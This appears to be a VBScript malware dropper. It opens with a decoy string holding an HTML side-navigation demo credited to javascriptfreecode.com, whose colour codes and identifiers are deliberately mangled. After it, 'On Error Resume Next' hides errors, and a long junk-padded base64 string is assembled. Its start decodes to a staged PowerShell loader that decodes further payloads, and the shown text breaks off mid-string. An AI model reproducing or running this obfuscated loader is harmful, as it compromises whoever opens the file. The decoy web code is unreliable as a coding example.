Dim qwmiyCOC
qwmiyCOC = "                                                " & vbCrLf & _
"                                                <!-- this script is provided by https://www.javascriptfreecode.com coded by: Kerixa Inc. -->" & vbCrLf & _
"<!DOCTYPE html>" & vbCrLf & _
"" & vbCrLf & _
"<html lang=""en"">" & vbCrLf & _
"" & vbCrLf & _
"<head>" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"    <meta charset=""UTF-8"">" & vbCrLf & _
"" & vbCrLf & _
"    <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">" & vbCrLf & _
"" & vbCrLf & _
"    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">" & vbCrLf & _
"" & vbCrLf & _
"    <title>Side Navigation with Push Effect</title>" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"<!-- font awesome library include 5.15.4 -->" & vbCrLf & _
"" & vbCrLf & _
"<link rel=""stylesheet"" href=""https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"" integrity=""sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw=="" crossorigin=""anonymous"" referrerpolicy=""no-referrer"" />" & vbCrLf & _
"" & vbCrLf & _
"<!-- font library -->" & vbCrLf & _
"" & vbCrLf & _
"<link rel=""preconnect"" href=""https://fonts.googleapis.com""><link rel=""preconnect"" href=""https://fonts.gstatic.com"" crossorigin><link href=""https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap"" rel=""stylesheet"">" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"<!-- css styles -->" & vbCrLf & _
"" & vbCrLf & _
"<style>" & vbCrLf & _
"" & vbCrLf & _
" " & vbCrLf & _
"" & vbCrLf & _
"@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap'); " & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"/* default light theme */" & vbCrLf & _
"" & vbCrLf & _
":root, html{" & vbCrLf & _
"" & vbCrLf & _
"  margin: 0;" & vbCrLf & _
"" & vbCrLf & _
"  padding: 0;" & vbCrLf & _
"" & vbCrLf & _
"  font-family: ""Inter"", arial, monospace;" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"  --primary-color: mgkitbaktkqzbaqf45b69;" & vbCrLf & _
"" & vbCrLf & _
"  --secondary-color:mgkitbaktkqzbaq456990;" & vbCrLf & _
"" & vbCrLf & _
"  --background-color: white;" & vbCrLf & _
"" & vbCrLf & _
"  --button-color: black;" & vbCrLf & _
"" & vbCrLf & _
"  --button-bg-color: yellow;" & vbCrLf & _
"" & vbCrLf & _
"  --opacity: 0.75;" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"  --background-color: darkgrey;" & vbCrLf & _
"" & vbCrLf & _
"  --animation-length : 0.5s;" & vbCrLf & _
"" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"/* dark-mode theme */" & vbCrLf & _
"" & vbCrLf & _
":root[data-theme=""dark-mode""]{" & vbCrLf & _
"" & vbCrLf & _
"  " & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"/* JsdXMhUX styles */" & vbCrLf & _
"" & vbCrLf & _
"html, body{" & vbCrLf & _
"" & vbCrLf & _
"  margin: 0;" & vbCrLf & _
"" & vbCrLf & _
"  padding: 0;" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"body" & vbCrLf & _
"" & vbCrLf & _
"{" & vbCrLf & _
"" & vbCrLf & _
"  background-color:mgkitbaktkqzbaqf2f2f2;" & vbCrLf & _
"" & vbCrLf & _
"  font-family: 'RobotoDraft', 'Roboto', sans-serif;" & vbCrLf & _
"" & vbCrLf & _
"  -webkit-font-smoothing: antialiased;" & vbCrLf & _
"" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"a{" & vbCrLf & _
"" & vbCrLf & _
"  text-decoration: none;" & vbCrLf & _
"" & vbCrLf & _
"  color: rgb(200, 200, 200);" & vbCrLf & _
"" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"a:hover{" & vbCrLf & _
"" & vbCrLf & _
"  color: var(--primary-color);" & vbCrLf & _
"" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"*" & vbCrLf & _
"" & vbCrLf & _
"{" & vbCrLf & _
"" & vbCrLf & _
"  -webkit-box-sizing: border-box;" & vbCrLf & _
"" & vbCrLf & _
"  box-sizing: border-box;" & vbCrLf & _
"" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"div[class*=""section""]{" & vbCrLf & _
"" & vbCrLf & _
"  height: 100vh;" & vbCrLf & _
"" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
".QthTsjYb{" & vbCrLf & _
"" & vbCrLf & _
"  background-color: var(--primary-color);" & vbCrLf & _
"" & vbCrLf & _
"  " & vbCrLf & _
"" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
".QthTsjYb > .yVreSVEc{" & vbCrLf & _
"" & vbCrLf & _
"  display: flex;" & vbCrLf & _
"" & vbCrLf & _
"  justify-content: center;" & vbCrLf & _
"" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
".ruZVgTSn{" & vbCrLf & _
"" & vbCrLf & _
"  background-color: var(--secondary-color);" & vbCrLf & _
"" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"nav{" & vbCrLf & _
"" & vbCrLf & _
"  display: flex;" & vbCrLf & _
"" & vbCrLf & _
"  position: relative;" & vbCrLf & _
"" & vbCrLf & _
"  justify-content: end;" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
".DTsKwNiz {" & vbCrLf & _
"" & vbCrLf & _
"  margin: 0.5rem;" & vbCrLf & _
"" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
".DTsKwNiz:hover{" & vbCrLf & _
"" & vbCrLf & _
"  cursor: pointer;" & vbCrLf & _
"" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
".JsdXMhUX{" & vbCrLf & _
"" & vbCrLf & _
"  background-color: black;" & vbCrLf & _
"" & vbCrLf & _
"  width: 0;" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"  position: fixed;" & vbCrLf & _
"" & vbCrLf & _
"  top: 0;" & vbCrLf & _
"" & vbCrLf & _
"  left: 0;" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"  height: 100vh;" & vbCrLf & _
"" & vbCrLf & _
"  display: flex;" & vbCrLf & _
"" & vbCrLf & _
"  flex-direction: column;" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"  transition: width var(--animation-length);" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"  overflow-x: hidden;" & vbCrLf & _
"" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
".JsdXMhUX > .JsdXMhUX__exit {" & vbCrLf & _
"" & vbCrLf & _
"  align-self: end;" & vbCrLf & _
"" & vbCrLf & _
"  padding: 1rem;" & vbCrLf & _
"" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
".JsdXMhUX > .JsdXMhUX__exit *{" & vbCrLf & _
"" & vbCrLf & _
"  font-size: 2rem;" & vbCrLf & _
"" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
".JsdXMhUX > .SUGQZgEe{" & vbCrLf & _
"" & vbCrLf & _
"  padding: 0.5rem;" & vbCrLf & _
"" & vbCrLf & _
"  list-style: none;" & vbCrLf & _
"" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
".JsdXMhUX > .SUGQZgEe li {" & vbCrLf & _
"" & vbCrLf & _
"  font-size: 1.5rem;" & vbCrLf & _
"" & vbCrLf & _
"  padding: 0.5rem 0;" & vbCrLf & _
"" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
".JsdXMhUX i{" & vbCrLf & _
"" & vbCrLf & _
"  color: rgb(200, 200, 200);" & vbCrLf & _
"" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
".JsdXMhUX i:hover{" & vbCrLf & _
"" & vbCrLf & _
"  cursor: pointer;" & vbCrLf & _
"" & vbCrLf & _
"  color: white;" & vbCrLf & _
"" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"/* animation states */" & vbCrLf & _
"" & vbCrLf & _
".IuHwJxOG{" & vbCrLf & _
"" & vbCrLf & _
"  width: 0;" & vbCrLf & _
"" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
".overlay-active{" & vbCrLf & _
"" & vbCrLf & _
"  opacity: 1;" & vbCrLf & _
"" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
".JsdXMhUX{" & vbCrLf & _
"" & vbCrLf & _
"  transition: margin-left var(--animation-length);" & vbCrLf & _
"" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
".lPMsBHcL {" & vbCrLf & _
"" & vbCrLf & _
"    font-size: 88px;" & vbCrLf & _
"" & vbCrLf & _
"    color: mgkitbaktkqzbaq078bff;" & vbCrLf & _
"" & vbCrLf & _
"    font-family: ""Arial Black"", Gadget, sans-serif;" & vbCrLf & _
"" & vbCrLf & _
"    text-shadow: 0px 0px 0 rgb(-5,127,243)," & vbCrLf & _
"" & vbCrLf & _
"                 1px 1px 0 rgb(-18,114,230)," & vbCrLf & _
"" & vbCrLf & _
"                 2px 2px 0 rgb(-30,102,218)," & vbCrLf & _
"" & vbCrLf & _
"                 3px 3px 0 rgb(-43,89,205)," & vbCrLf & _
"" & vbCrLf & _
"                 4px 4px  0 rgb(-55,77,193)," & vbCrLf & _
"" & vbCrLf & _
"                 5px 5px 4px rgba(0,0,0,0.38)," & vbCrLf & _
"" & vbCrLf & _
"                 5px 5px 1px rgba(0,0,0,0.5)," & vbCrLf & _
"" & vbCrLf & _
"                 0px 0px 4px rgba(0,0,0,.2);" & vbCrLf & _
"" & vbCrLf & _
" }" & vbCrLf & _
"" & vbCrLf & _
"</style>" & vbCrLf & _
"" & vbCrLf & _
"</head>" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"<body>" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"<JsdXMhUX>" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"  <div class=""JsdXMhUX IuHwJxOG"">" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"    <div class=""JdvxpdVH"">" & vbCrLf & _
"" & vbCrLf & _
"      <i class=""RnoNjOAg-solid pDvCTLsR slOPnqAq""></i>" & vbCrLf & _
"" & vbCrLf & _
"    </div>" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"    <ul class=""SUGQZgEe"">" & vbCrLf & _
"" & vbCrLf & _
"      <li><a href=""http://www.javascriptfreecode.com"">Javascript Free Code</a></li>" & vbCrLf & _
"" & vbCrLf & _
"      <li><a href="""">Services</a></li>" & vbCrLf & _
"" & vbCrLf & _
"      <li><a href="""">Clients</a></li>" & vbCrLf & _
"" & vbCrLf & _
"      <li><a href="""">Contact</a></li>" & vbCrLf & _
"" & vbCrLf & _
"    </ul>" & vbCrLf & _
"" & vbCrLf & _
"  </div>" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"  " & vbCrLf & _
"" & vbCrLf & _
"  <section class=""JsdXMhUX"">" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"      <div class=""QthTsjYb"">" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"        <nav>" & vbCrLf & _
"" & vbCrLf & _
"          <div class=""DTsKwNiz"">" & vbCrLf & _
"" & vbCrLf & _
"            <i class=""RnoNjOAg RnoNjOAg-bars RnoNjOAg-lg js-JsdXMhUX"" aria-hidden=""true""></i>" & vbCrLf & _
"" & vbCrLf & _
"          </div>" & vbCrLf & _
"" & vbCrLf & _
"        </nav>" & vbCrLf & _
"" & vbCrLf & _
"        <div class=""yVreSVEc"">" & vbCrLf & _
"" & vbCrLf & _
"          <div class=""lPMsBHcL"">KERIXA</div>" & vbCrLf & _
"" & vbCrLf & _
"        </div>" & vbCrLf & _
"" & vbCrLf & _
"  " & vbCrLf & _
"" & vbCrLf & _
"      </div>" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"      <div class=""ruZVgTSn"">" & vbCrLf & _
"" & vbCrLf & _
"   " & vbCrLf & _
"" & vbCrLf & _
"      </div>" & vbCrLf & _
"" & vbCrLf & _
"  </section>" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"</JsdXMhUX>" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"<script>" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"/*   " & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"Tutorial Description" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"Side navigation JsdXMhUX with push effect that moves the page to the right." & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"*/" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"const JsdXMhUX = document.querySelector("".js-JsdXMhUX"");" & vbCrLf & _
"" & vbCrLf & _
"const JsdXMhUX = document.querySelector("".slOPnqAq"");" & vbCrLf & _
"" & vbCrLf & _
"const JsdXMhUX = document.querySelector("".JsdXMhUX"");" & vbCrLf & _
"" & vbCrLf & _
"const JsdXMhUX = document.querySelector("".JsdXMhUX"");" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"if(JsdXMhUX != null){" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"  JsdXMhUX.addEventListener(""click"", (event) => {" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"    if(JsdXMhUX.classList.contains(""IuHwJxOG"")){" & vbCrLf & _
"" & vbCrLf & _
"      JsdXMhUX.classList.remove(""IuHwJxOG"");" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"      JsdXMhUX.style.marginLeft = ""15rem"";" & vbCrLf & _
"" & vbCrLf & _
"      JsdXMhUX.style.width=""15rem"";" & vbCrLf & _
"" & vbCrLf & _
"    }" & vbCrLf & _
"" & vbCrLf & _
"    " & vbCrLf & _
"" & vbCrLf & _
"  })" & vbCrLf & _
"" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"if(JsdXMhUX != null){" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"  JsdXMhUX.addEventListener(""click"", (event) => {" & vbCrLf & _
"" & vbCrLf & _
"    " & vbCrLf & _
"" & vbCrLf & _
"    if(!JsdXMhUX.classList.contains(""IuHwJxOG"")){" & vbCrLf & _
"" & vbCrLf & _
"      JsdXMhUX.style.marginLeft = ""0"";" & vbCrLf & _
"" & vbCrLf & _
"      JsdXMhUX.style.width= 0;" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"      JsdXMhUX.classList.add(""IuHwJxOG"");" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"    }" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"  })" & vbCrLf & _
"" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"</script>" & vbCrLf & _
"" & vbCrLf & _
"</body>" & vbCrLf & _
"" & vbCrLf & _
"</html><a target='_blank' href='https://www.javascriptfreecode.com' style='font-size: 8pt; text-decoration: none'>JavaScript Best Codes</a>                                                " & vbCrLf & _
"                                            " & vbCrLf
 On Error Resume Next

ferromagnetism = "JmgkitbaktkqzbaqGmgkitbaktkqzbaqlmgkitbaktkqzbaqzmgkitbaktkqzbaqbmgkitbaktkqzbaq2mgkitbaktkqzbaqRmgkitbaktkqzbaq1mgkitbaktkqzbaqbmgkitbaktkqzbaqGmgkitbaktkqzbaqNmgkitbaktkqzbaqpmgkitbaktkqzbaqdmgkitbaktkqzbaqGmgkitbaktkqzbaqUmgkitbaktkqzbaqgmgkitbaktkqzbaqPmgkitbaktkqzbaqSmgkitbaktkqzbaqAmgkitbaktkqzbaqnmgkitbaktkqzbaqVmgkitbaktkqzbaqmmgkitbaktkqzbaqtmgkitbaktkqzbaqGmgkitbaktkqzbaqSmgkitbaktkqzbaqimgkitbaktkqzbaqcmgkitbaktkqzbaq7mgkitbaktkqzbaqJmgkitbaktkqzbaqHmgkitbaktkqzbaqVmgkitbaktkqzbaqumgkitbaktkqzbaqdmgkitbaktkqzbaqHmgkitbaktkqzbaqdmgkitbaktkqzbaqpmgkitbaktkqzbaqcmgkitbaktkqzbaq3mgkitbaktkqzbaqRmgkitbaktkqzbaqpmgkitbaktkqzbaqbmgkitbaktkqzbaqmmgkitbaktkqzbaqcmgkitbaktkqzbaqgmgkitbaktkqzbaqPmgkitbaktkqzbaqSmgkitbaktkqzbaqBmgkitbaktkqzbaqbmgkitbaktkqzbaqUmgkitbaktkqzbaq3mgkitbaktkqzbaqlmgkitbaktkqzbaqzmgkitbaktkqzbaqdmgkitbaktkqzbaqGmgkitbaktkqzbaqVmgkitbaktkqzbaqtmgkitbaktkqzbaqLmgkitbaktkqzbaqkmgkitbaktkqzbaqNmgkitbaktkqzbaqvmgkitbaktkqzbaqbmgkitbaktkqzbaqnmgkitbaktkqzbaqZmgkitbaktkqzbaqlmgkitbaktkqzbaqcmgkitbaktkqzbaqnmgkitbaktkqzbaqRmgkitbaktkqzbaqdmgkitbaktkqzbaqOmgkitbaktkqzbaqjmgkitbaktkqzbaqpmgkitbaktkqzbaqGmgkitbaktkqzbaqcmgkitbaktkqzbaqmmgkitbaktkqzbaq9mgkitbaktkqzbaqtmgkitbaktkqzbaqQmgkitbaktkqzbaqmmgkitbaktkqzbaqFmgkitbaktkqzbaqzmgkitbaktkqzbaqZmgkitbaktkqzbaqTmgkitbaktkqzbaqYmgkitbaktkqzbaq0mgkitbaktkqzbaqUmgkitbaktkqzbaq3mgkitbaktkqzbaqRmgkitbaktkqzbaqymgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaqnmgkitbaktkqzbaqKmgkitbaktkqzbaqCmgkitbaktkqzbaqRmgkitbaktkqzbaqpmgkitbaktkqzbaqcmgkitbaktkqzbaq2mgkitbaktkqzbaq9mgkitbaktkqzbaqkmgkitbaktkqzbaqdmgkitbaktkqzbaqWmgkitbaktkqzbaqxmgkitbaktkqzbaqjmgkitbaktkqzbaqamgkitbaktkqzbaqXmgkitbaktkqzbaqRmgkitbaktkqzbaqlmgkitbaktkqzbaqKmgkitbaktkqzbaqTmgkitbaktkqzbaqsmgkitbaktkqzbaqkmgkitbaktkqzbaqbmgkitbaktkqzbaq2mgkitbaktkqzbaq9mgkitbaktkqzbaqwmgkitbaktkqzbaqamgkitbaktkqzbaqHmgkitbaktkqzbaqlmgkitbaktkqzbaq0mgkitbaktkqzbaqZmgkitbaktkqzbaqSmgkitbaktkqzbaqAmgkitbaktkqzbaq9mgkitbaktkqzbaqImgkitbaktkqzbaqFmgkitbaktkqzbaqtmgkitbaktkqzbaqTmgkitbaktkqzbaqemgkitbaktkqzbaqXmgkitbaktkqzbaqNmgkitbaktkqzbaq0mgkitbaktkqzbaqZmgkitbaktkqzbaqWmgkitbaktkqzbaq0mgkitbaktkqzbaqumgkitbaktkqzbaqVmgkitbaktkqzbaqGmgkitbaktkqzbaqVmgkitbaktkqzbaq4mgkitbaktkqzbaqdmgkitbaktkqzbaqCmgkitbaktkqzbaq5mgkitbaktkqzbaqFmgkitbaktkqzbaqbmgkitbaktkqzbaqmmgkitbaktkqzbaqNmgkitbaktkqzbaqvmgkitbaktkqzbaqZmgkitbaktkqzbaqGmgkitbaktkqzbaqlmgkitbaktkqzbaqumgkitbaktkqzbaqZmgkitbaktkqzbaq1mgkitbaktkqzbaq0mgkitbaktkqzbaq6mgkitbaktkqzbaqOmgkitbaktkqzbaqlmgkitbaktkqzbaqVmgkitbaktkqzbaqUmgkitbaktkqzbaqRmgkitbaktkqzbaqjmgkitbaktkqzbaqgmgkitbaktkqzbaqumgkitbaktkqzbaqRmgkitbaktkqzbaq2mgkitbaktkqzbaqVmgkitbaktkqzbaq0mgkitbaktkqzbaqUmgkitbaktkqzbaq3mgkitbaktkqzbaqRmgkitbaktkqzbaqymgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaqnmgkitbaktkqzbaqKmgkitbaktkqzbaqCmgkitbaktkqzbaqRmgkitbaktkqzbaq1mgkitbaktkqzbaqbmgkitbaktkqzbaqnmgkitbaktkqzbaqRmgkitbaktkqzbaq3mgkitbaktkqzbaqamgkitbaktkqzbaqXmgkitbaktkqzbaqNmgkitbaktkqzbaq0mgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaqnmgkitbaktkqzbaqKmgkitbaktkqzbaqTmgkitbaktkqzbaqsmgkitbaktkqzbaqkmgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaqkmgkitbaktkqzbaqZmgkitbaktkqzbaqWmgkitbaktkqzbaqNmgkitbaktkqzbaqpmgkitbaktkqzbaqcmgkitbaktkqzbaq2mgkitbaktkqzbaqlmgkitbaktkqzbaqvmgkitbaktkqzbaqbmgkitbaktkqzbaqimgkitbaktkqzbaqAmgkitbaktkqzbaq9mgkitbaktkqzbaqImgkitbaktkqzbaqCmgkitbaktkqzbaqdmgkitbaktkqzbaqRmgkitbaktkqzbaqMmgkitbaktkqzbaqnmgkitbaktkqzbaqhmgkitbaktkqzbaqomgkitbaktkqzbaqYmgkitbaktkqzbaqzmgkitbaktkqzbaqNmgkitbaktkqzbaqOmgkitbaktkqzbaqTmgkitbaktkqzbaqWmgkitbaktkqzbaqFmgkitbaktkqzbaqXmgkitbaktkqzbaqSmgkitbaktkqzbaqnmgkitbaktkqzbaqlmgkitbaktkqzbaqZmgkitbaktkqzbaqWmgkitbaktkqzbaqEmgkitbaktkqzbaqomgkitbaktkqzbaq1mgkitbaktkqzbaqTmgkitbaktkqzbaqVmgkitbaktkqzbaqMmgkitbaktkqzbaq1mgkitbaktkqzbaqSmgkitbaktkqzbaqWmgkitbaktkqzbaqImgkitbaktkqzbaqymgkitbaktkqzbaqMmgkitbaktkqzbaqWmgkitbaktkqzbaqwmgkitbaktkqzbaqnmgkitbaktkqzbaqOmgkitbaktkqzbaqymgkitbaktkqzbaqRmgkitbaktkqzbaqnmgkitbaktkqzbaqYmgkitbaktkqzbaqWmgkitbaktkqzbaqxmgkitbaktkqzbaqsmgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaqFmgkitbaktkqzbaqtmgkitbaktkqzbaqYmgkitbaktkqzbaqmmgkitbaktkqzbaqlmgkitbaktkqzbaqjmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaq0mgkitbaktkqzbaqgmgkitbaktkqzbaqWmgkitbaktkqzbaq1mgkitbaktkqzbaqNmgkitbaktkqzbaq5mgkitbaktkqzbaqcmgkitbaktkqzbaq3mgkitbaktkqzbaqRmgkitbaktkqzbaqlmgkitbaktkqzbaqbmgkitbaktkqzbaqSmgkitbaktkqzbaq5mgkitbaktkqzbaqDmgkitbaktkqzbaqbmgkitbaktkqzbaq2mgkitbaktkqzbaq5mgkitbaktkqzbaq2mgkitbaktkqzbaqZmgkitbaktkqzbaqXmgkitbaktkqzbaqJmgkitbaktkqzbaq0mgkitbaktkqzbaqXmgkitbaktkqzbaqTmgkitbaktkqzbaqomgkitbaktkqzbaq6mgkitbaktkqzbaqRmgkitbaktkqzbaqnmgkitbaktkqzbaqJmgkitbaktkqzbaqvmgkitbaktkqzbaqbmgkitbaktkqzbaqWmgkitbaktkqzbaqJmgkitbaktkqzbaqhmgkitbaktkqzbaqcmgkitbaktkqzbaq2mgkitbaktkqzbaqUmgkitbaktkqzbaq2mgkitbaktkqzbaqNmgkitbaktkqzbaqFmgkitbaktkqzbaqNmgkitbaktkqzbaq0mgkitbaktkqzbaqcmgkitbaktkqzbaqmmgkitbaktkqzbaqlmgkitbaktkqzbaqumgkitbaktkqzbaqZmgkitbaktkqzbaqymgkitbaktkqzbaqgmgkitbaktkqzbaqkmgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaqkmgkitbaktkqzbaqZmgkitbaktkqzbaqWmgkitbaktkqzbaqNmgkitbaktkqzbaqpmgkitbaktkqzbaqcmgkitbaktkqzbaq2mgkitbaktkqzbaqlmgkitbaktkqzbaqvmgkitbaktkqzbaqbmgkitbaktkqzbaqimgkitbaktkqzbaqkmgkitbaktkqzbaq7mgkitbaktkqzbaqJmgkitbaktkqzbaqGmgkitbaktkqzbaq5mgkitbaktkqzbaqvmgkitbaktkqzbaqbmgkitbaktkqzbaqmmgkitbaktkqzbaqFmgkitbaktkqzbaqumgkitbaktkqzbaqcmgkitbaktkqzbaq3mgkitbaktkqzbaqdmgkitbaktkqzbaqlmgkitbakt"
ferromagnetism = ferromagnetism & "kqzbaqcmgkitbaktkqzbaqimgkitbaktkqzbaqAmgkitbaktkqzbaq9mgkitbaktkqzbaqImgkitbaktkqzbaqFmgkitbaktkqzbaqtmgkitbaktkqzbaqTmgkitbaktkqzbaqemgkitbaktkqzbaqXmgkitbaktkqzbaqNmgkitbaktkqzbaq0mgkitbaktkqzbaqZmgkitbaktkqzbaqWmgkitbaktkqzbaq0mgkitbaktkqzbaqumgkitbaktkqzbaqVmgkitbaktkqzbaqGmgkitbaktkqzbaqVmgkitbaktkqzbaq4mgkitbaktkqzbaqdmgkitbaktkqzbaqCmgkitbaktkqzbaq5mgkitbaktkqzbaqFmgkitbaktkqzbaqbmgkitbaktkqzbaqmmgkitbaktkqzbaqNmgkitbaktkqzbaqvmgkitbaktkqzbaqZmgkitbaktkqzbaqGmgkitbaktkqzbaqlmgkitbaktkqzbaqumgkitbaktkqzbaqZmgkitbaktkqzbaq1mgkitbaktkqzbaq0mgkitbaktkqzbaq6mgkitbaktkqzbaqOmgkitbaktkqzbaqlmgkitbaktkqzbaqVmgkitbaktkqzbaqUmgkitbaktkqzbaqRmgkitbaktkqzbaqjmgkitbaktkqzbaqgmgkitbaktkqzbaqumgkitbaktkqzbaqRmgkitbaktkqzbaq2mgkitbaktkqzbaqVmgkitbaktkqzbaq0mgkitbaktkqzbaqUmgkitbaktkqzbaq3mgkitbaktkqzbaqRmgkitbaktkqzbaqymgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaqnmgkitbaktkqzbaqKmgkitbaktkqzbaqCmgkitbaktkqzbaqRmgkitbaktkqzbaqnmgkitbaktkqzbaqYmgkitbaktkqzbaqWmgkitbaktkqzbaqxmgkitbaktkqzbaqsmgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaqFmgkitbaktkqzbaqtmgkitbaktkqzbaqYmgkitbaktkqzbaqmmgkitbaktkqzbaqlmgkitbaktkqzbaqjmgkitba